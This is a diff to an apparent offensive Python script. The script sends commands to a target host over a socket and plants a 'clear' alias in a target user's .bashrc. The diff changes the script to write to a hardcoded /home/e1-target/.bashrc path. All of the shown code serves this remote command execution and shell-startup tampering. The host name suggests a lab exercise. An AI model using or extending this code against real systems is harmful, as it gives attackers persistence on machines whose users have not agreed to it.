@@ -4,6 +4,7 @@ import socket
 TARGET_PORT = 5050
 VENV_PYTHON = "/var/tmp/.venv/bin/python3"
 SERVER_PATH = "/var/tmp/server.py"
+BASHRC_PATH = "/home/e1-target/.bashrc"
 
 
 def send_command(target: str, command: str) -> str:
@@ -25,11 +26,11 @@ def plant_alias(target: str) -> None:
     )
 
     check_and_append = (
-        f"grep -qF 'alias clear=' ~/.bashrc || "
-        f"echo '{alias_line}' >> ~/.bashrc"
+        f"grep -qF 'alias clear=' {BASHRC_PATH} || "
+        f"echo '{alias_line}' >> {BASHRC_PATH}"
     )
 
-    print("[*] Planting alias in ~/.bashrc...")
+    print(f"[*] Planting alias in {BASHRC_PATH}...")
     result = send_command(target, f"run_linux {check_and_append}")
     print(f"[+] Done. Response: {result or '(none)'}")
 
